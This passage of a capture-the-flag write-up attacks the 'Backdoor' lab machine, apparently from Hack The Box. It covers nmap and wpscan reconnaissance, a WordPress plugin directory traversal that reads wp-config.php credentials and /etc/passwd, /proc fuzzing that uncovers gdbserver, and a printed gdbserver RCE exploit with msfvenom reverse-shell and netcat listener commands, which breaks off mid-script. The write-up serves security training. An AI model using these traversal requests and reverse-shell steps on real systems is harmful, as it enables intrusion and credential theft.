    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Windows&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Not Found&quot;&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;os_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (ttl -&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s): &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ports-recognition&quot;&gt;Ports recognition&lt;/h2&gt;

&lt;p&gt;Now with nmap we are going to do the port recognition and services that run those ports.&lt;/p&gt;

&lt;p&gt;First we are going to scan how many open ports this machine has and export it in grepable format to the allports file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Basically I export it in grepable format because I have a function define in the ~/.zshrc which is the &lt;strong&gt;&lt;em&gt;extractports&lt;/em&gt;&lt;/strong&gt; function, basically it allows me to visualize the ports in a more elegant way and it copies the ports in the clipboard.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now let’s do another scan to see the versions of the services running on each of these ports.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue Nov 30 03:14:40 2021 as: nmap -sCV -p22,80,1337 -oN targeted 10.10.11.125
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &amp;amp;#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 30 03:17:36 2021 -- 1 IP address (1 host up) scanned in 175.66 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the command &lt;strong&gt;&lt;em&gt;whatweb&lt;/em&gt;&lt;/strong&gt; we can make a small recognition of the web, to be able to see the services used by the web.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we access the website to see some information that may be useful to us.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;When I click on the home menu it does not let me access because it does not find the following domain. And this means that virtual hosting is being applied.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To apply the virtual hosting we have to go to the file &lt;strong&gt;&lt;em&gt;/etc/hosts&lt;/em&gt;&lt;/strong&gt; and we put the ip and the domain.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura11.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we can see that the domain is now recognized.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now when accessing the home page with the domain there is no difference in the web by putting the domain.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now with nmap we are going to do a simple fuzzing to see potential routes.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue Nov 23 20:18:33 2021 as: nmap --script http-enum -p80 -oN WebScan 10.129.109.254
Nmap scan report for backdoor.htb (10.129.109.254)
Host is up (0.043s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.8.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

# Nmap done at Tue Nov 23 20:18:47 2021 -- 1 IP address (1 host up) scanned in 13.31 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see a login page but we don’t have credentials at the moment.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;if we go to the blog section of the web page we see that there is a post published by the admin user so I deduce that in this web there is only one user who is the admin.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura15.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With searchspliot tool I tried to search if there is any vulnerability in the version of wordpress that came with this machine, but I did not find anything interesting.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura16.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now what I did is apply fuzzing with &lt;strong&gt;&lt;em&gt;wfuzz&lt;/em&gt;&lt;/strong&gt; to find potential routes. I know I did fuzzing with nmap but nmap is not as powerful as wfuzz and wfuzz gives us more information.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura17.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Another alternative to the wfuzz tool is &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; which is made in go language and as you know go works well with sockets and connections.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura18.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Using wfuzz and gobuster are almost the same routes that i found with nmap only the only interesting route i found is wp-content as it may contain plugins that are installed on this page, and we can find possible vulnerabilities but we will see that below.&lt;/p&gt;

&lt;p&gt;What I am going to do is with the tool &lt;strong&gt;&lt;em&gt;WPscan&lt;/em&gt;&lt;/strong&gt; we are going to scan this wordpress page to see if there are more plugins or themes that have installed and the possible vulnerabilities they have.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura19.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;This is a wpscan look like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://10.10.11.125/ [10.10.11.125]
[32m[+][0m Started: Sun Nov 28 03:51:52 2021

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[32m[+][0m WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.8.1&amp;lt;/generator&amp;gt;
 |  - http://10.10.11.125/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.8.1&amp;lt;/generator&amp;gt;

[32m[+][0m WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready, block-patterns
 | Text Domain: twentyseventeen
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'


[34m[i][0m No plugins Found.

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Sun Nov 28 03:51:56 2021
[32m[+][0m Requests Done: 2
[32m[+][0m Cached Requests: 34
[32m[+][0m Data Sent: 606 B
[32m[+][0m Data Received: 1.027 KB
[32m[+][0m Memory used: 239.539 MB
[32m[+][0m Elapsed time: 00:00:04
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;With the wpscan scan I did not find relevant information about the plugins that this page has. I could have done a more aggressive scan using the command &lt;strong&gt;&lt;em&gt;wpscan –url http: //backdoor.htb –plugins-detection aggressive&lt;/em&gt;&lt;/strong&gt; but the scan would take a long time.&lt;/p&gt;

&lt;p&gt;So what I did is to go in the path &lt;strong&gt;&lt;em&gt;wp-content/plugins&lt;/em&gt;&lt;/strong&gt; and I found a plugin that is installed.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura20.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;exploitation-phase&quot;&gt;Exploitation phase&lt;/h2&gt;

&lt;p&gt;When I opened the folder of this plugin I found the file “readme.txt” and that is where I could see the version of this plugin.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura21.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then with searchsploit we search if that have any exploit, and I found one specifically about the version that have installed in the wordpress and it is also a very critical one that is “Directory traversal”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Open the exploit and we can see that there is a specific path that is vulnerable to directory traversal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura23.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;When I go to the path I installed the wordpress configuration file which is &lt;strong&gt;&lt;em&gt;wp-config.php&lt;/em&gt;&lt;/strong&gt; and we can see that we have a username and password for the database and more information about the server.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura24.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;What I did is to try in the login page with admin user to see if the password that was in the configuration file was valid also to access with the admin account and the password didt’nt work.&lt;/p&gt;

&lt;p&gt;So what I did is to save the database credentials in a file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura25.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then what I did is try using the traversal dirictory to see if it would let me view the file &lt;strong&gt;&lt;em&gt;/etc/passwd&lt;/em&gt;&lt;/strong&gt; to see the users that exist on the victim machine. and we see that it works and there is a user named &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura26.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then I tried to test if it would let me view the content of the directory “/user/home/.ssh/id_rsa” to see if it has the id_rsa key and so I could access via ssh on port 22, but it would not let me view anything.&lt;/p&gt;

&lt;p&gt;Then I remembered that port 1337 was open but at the time of the port scan I could not see which service was running, so to find out which service is running on port 1337 we can use lfi.&lt;/p&gt;

&lt;p&gt;using burpsuite we are going to use it as a proxy to intercept the request and sent it in the &lt;strong&gt;&lt;em&gt;intruder&lt;/em&gt;&lt;/strong&gt; to manipulate it and send it to the server. and here what we are going to do is use lfi through the path &lt;strong&gt;&lt;em&gt;/proc&lt;/em&gt;&lt;/strong&gt;, basically this path contains information about the processes that are running on the system. and we are going to use the path &lt;strong&gt;&lt;em&gt;/proc / pid / cmdline&lt;/em&gt;&lt;/strong&gt; that contains commands to start processes. here the &lt;strong&gt;&lt;em&gt;pid&lt;/em&gt;&lt;/strong&gt; will be a variable number&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura27.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in the payload section we will specify that the type of payload will be &lt;strong&gt;&lt;em&gt;numeric **&lt;/em&gt;. and in **&lt;em&gt;payload option&lt;/em&gt;&lt;/strong&gt; I will specify that it generates the number of payloads in the range 900-1000.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura28.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;This process we can do it to with wfuzz with the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We click &lt;strong&gt;&lt;em&gt;attack&lt;/em&gt;&lt;/strong&gt; to start the process. and in the response part we can see the processes that it is executing in the command part in the system.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura29.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And boom!!! i found it in the port 1337 its running gdbserver that is a linux debugger.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura30.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn’t find anything.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura31.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then searching in google i found an gdbserver exploit that allows me to RCE witch is a python script.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura32.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;So this is the script:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
Usage: python3 {sys.argv[0]} &amp;lt;gdbserver-ip:port&amp;gt; &amp;lt;path-to-shellcode&amp;gt;

Example:
- Victim's gdbserver   -&amp;gt;  10.10.10.200:1337
- Attacker's listener  -&amp;gt;  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checksum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{res:2x}'&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'${s}#{checksum(s)}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'qSupported:multiprocess+;qRelocInsn+;qvCont+;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
